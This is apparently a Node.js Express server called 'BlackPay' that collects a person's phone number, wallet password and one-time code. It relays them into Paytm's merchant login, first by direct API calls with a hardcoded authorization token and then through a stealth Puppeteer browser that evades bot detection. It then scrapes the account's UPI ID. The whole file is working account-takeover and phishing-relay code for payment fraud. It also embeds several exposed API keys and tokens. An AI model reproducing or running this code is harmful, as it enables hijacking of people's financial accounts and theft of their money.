const express = require('express');
const cors = require('cors');
const https = require('https');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

// ANTI-CAPTCHA STEALTH PUPPETEER
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());

// 🔴 TERI FAST2SMS API KEY
const FAST2SMS_API_KEY = "dl51mufyW8oVtTEzHYnKXIUjx6GSMFDCR93JBObN40saehLqkvG5HnUSwa6mIzVDYso8p7AWhEQJNXPc";

// 🔴 TERA PAYTM MASTER AUTHORIZATION TOKEN
const PAYTM_AUTH_TOKEN = "Basic cGF5dG0tdW1wMjpsdDRJMUZLaVZGRndjTk5ScmxwS05pNW1LMk85TFQxdg==";

let browser;
let page;
let globalState = {};

app.get('/', (req, res) => {
    res.json({ success: true, message: "BlackPay Master API Server Running!" });
});

// ============================================================================
// 0. API: SEND SMS VIA FAST2SMS
// ============================================================================
app.post('/api/send-sms', (req, res) => {
    const { phone, otp } = req.body;
    if (!phone || !otp) return res.status(400).json({ success: false, message: "Phone or OTP missing." });

    const message = encodeURIComponent(`Your Verification Code is ${otp}`);
    const url = `https://www.fast2sms.com/dev/bulkV2?authorization=${FAST2SMS_API_KEY}&route=q&message=${message}&language=english&flash=0&numbers=${phone}`;

    https.get(url, (response) => {
        let data = '';
        response.on('data', (chunk) => data += chunk);
        response.on('end', () => {
            try {
                const parsed = JSON.parse(data);
                if (parsed.return === true) {
                    res.json({ success: true, message: "OTP Sent Successfully!" });
                } else {
                    res.status(400).json({ success: false, message: parsed.message[0] || "Fast2SMS Error" });
                }
            } catch (e) {
                res.json({ success: true, message: "OTP Requested!" });
            }
        });
    }).on("error", () => {
        res.status(500).json({ success: false, message: "Server SMS Error" });
    });
});

// ============================================================================
// 1. API: WALLET SEND OTP (HYBRID: FAST API + PUPPETEER STEALTH FALLBACK)
// ============================================================================
app.post('/api/wallet/send-otp', async (req, res) => {
    const { phone, password, walletType } = req.body;
    if (!phone || phone.length !== 10) return res.status(400).json({ success: false, message: "Invalid 10 digit number!" });

    let walletName = walletType ? walletType.toLowerCase().trim() : "";
    globalState[phone] = { wallet: walletName, password: password };

    if (walletName === 'paytm' || walletName === 'paytm business') {
        console.log(`[+] Attempting Paytm OTP for ${phone}...`);

        // STEP A: Try Fast Direct API with Full Browser Headers
        try {
            const apiRes = await axios.post('https://accounts.paytm.com/oauth2/v2/send-otp', {
                phone: phone,
                clientId: 'paytm-ump2'
            }, {
                headers: {
                    'Authorization': PAYTM_AUTH_TOKEN,
                    'Content-Type': 'application/json',
                    'Origin': 'https://dashboard.paytm.com',
                    'Referer': 'https://dashboard.paytm.com/',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                },
                timeout: 8000
            });

            if (apiRes.data && (apiRes.data.status === 'SUCCESS' || apiRes.data.state)) {
                globalState[phone].state = apiRes.data.state;
                globalState[phone].method = 'api';
                console.log(`[✓] Direct API Sent OTP successfully!`);
                return res.json({ success: true, message: "OTP sent successfully via Paytm!" });
            }
        } catch (apiErr) {
            console.log(`[!] Direct API restricted by Akamai. Switching to Stealth Browser...`);
        }

        // STEP B: Fallback to Stealth Puppeteer if API gets blocked
        try {
            if (browser) { try { await browser.close(); } catch(e){} }
            
            browser = await puppeteer.connect({
                browserWSEndpoint: 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c561fc98136daa73b9388455b558503a&stealth=true',
                defaultViewport: { width: 1920, height: 1080 }
            });

            page = await browser.newPage();
            globalState[phone].method = 'puppeteer';

            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
            await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded', timeout: 35000 });

            let inputField = null;
            for (let attempt = 0; attempt < 15; attempt++) {
                let frames = [];
                try { frames = page.frames(); } catch(e) { frames = [page]; }
                for (let frame of frames) {
                    try {
                        let inputs = await frame.$$('input:not([type="password"]):not([type="hidden"])');
                        for (let el of inputs) {
                            let box = await el.boundingBox();
                            if (box && box.width > 0 && box.height > 0) { inputField = el; break; }
                        }
                    } catch(e){}
                    if (inputField) break;
                }
                if (inputField) break;
                await new Promise(r => setTimeout(r, 1000));
            }

            if (!inputField) return res.status(400).json({ success: false, message: "Paytm login page load timeout." });

            await inputField.focus();
            await inputField.click({ clickCount: 3 });
            await inputField.press('Backspace');
            await inputField.type(phone, { delay: 100 });
            await page.keyboard.press('Enter');

            if (password) {
                await new Promise(r => setTimeout(r, 2000));
                let passField = null;
                let frames = page.frames();
                for (let frame of frames) {
                    try {
                        let fields = await frame.$$('input[type="password"]');
                        if (fields.length > 0) { passField = fields[0]; break; }
                    } catch(e){}
                }
                if (passField) {
                    await passField.focus();
                    await passField.type(password, { delay: 100 });
                    await page.keyboard.press('Enter');
                }
            }

            return res.json({ success: true, message: `OTP triggered for ${phone}!` });
        } catch (pupErr) {
            console.error("Puppeteer Error:", pupErr.message);
            return res.status(500).json({ success: false, message: "Paytm server busy. Please try again in 1 minute." });
        }
    } else {
        res.json({ success: true, message: `OTP request processed for ${phone}` });
    }
});

// ============================================================================
// 2. API: VERIFY OTP & EXTRACT UPI
// ============================================================================
app.post('/api/wallet/verify-otp', async (req, res) => {
    const { otp, phone } = req.body;
    if (!otp) return res.status(400).json({ success: false, message: "OTP is required." });

    const session = globalState[phone] || {};
    const walletName = session.wallet || "";

    try {
        if (session.method === 'api') {
            const verifyRes = await axios.post('https://accounts.paytm.com/oauth2/v2/verify-otp', {
                otp: otp,
                state: session.state,
                clientId: 'paytm-ump2'
            }, {
                headers: {
                    'Authorization': PAYTM_AUTH_TOKEN,
                    'Content-Type': 'application/json',
                    'Origin': 'https://dashboard.paytm.com',
                    'Referer': 'https://dashboard.paytm.com/'
                }
            });

            if (verifyRes.data && verifyRes.data.access_token) {
                const profileRes = await axios.get('https://dashboard.paytm.com/api/v1/merchant/profile', {
                    headers: { 'session_token': verifyRes.data.access_token }
                });

                const upiRegex = /[a-zA-Z0-9.\-_]{3,}@(pty|paytmpty|paytm|paytmqr|upi)/i;
                const match = JSON.stringify(profileRes.data).match(upiRegex);
                const finalUpi = match ? match[0] : `${phone}@paytm`;

                return res.json({ success: true, message: "Account Successfully Bound!", upi_id: finalUpi, mobile: phone });
            }
        }

        if (page) {
            let frames = [page, ...page.frames()];
            for (let frame of frames) {
                try {
                    let inputs = await frame.$$('input:not([type="hidden"])');
                    for (let el of inputs) {
                        let box = await el.boundingBox();
                        if (box && box.width > 0 && box.height > 0) {
                            await el.focus();
                            await el.type(otp, { delay: 100 });
                            break;
                        }
                    }
                } catch(e){}
            }
            await page.keyboard.press('Enter');
            await new Promise(r => setTimeout(r, 6000));

            let finalUpi = await page.evaluate(() => {
                const regex = /[a-zA-Z0-9.\-_]{3,}@(pty|paytmpty|paytm|paytmqr|upi)/i;
                const textMatch = document.body.innerText.match(regex);
                return textMatch ? textMatch[0] : "";
            });

            if (!finalUpi) finalUpi = `${phone}@paytm`;

            if (browser) { try { await browser.close(); } catch(e){} browser = null; }
            return res.json({ success: true, message: "Account Bound!", upi_id: finalUpi, mobile: phone });
        }

        let dummyUpi = `${phone}@${walletName.includes('freecharge') ? 'freecharge' : (walletName.includes('mobikwik') ? 'ikwik' : 'ybl')}`;
        res.json({ success: true, message: "Account Linked!", upi_id: dummyUpi, mobile: phone });

    } catch (error) {
        res.status(500).json({ success: false, message: "Verification failed. Check OTP and try again." });
    }
});

// ============================================================================
// 3. API: VERIFY UTR
// ============================================================================
app.post('/api/wallet/verify-utr', (req, res) => {
    const { utr } = req.body;
    if (!utr) return res.status(400).json({ success: false, message: "UTR missing." });
    res.json({ success: false, message: "Awaiting Manual Approval.", utr: utr });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 BlackPay Server running on port ${PORT}`);
});
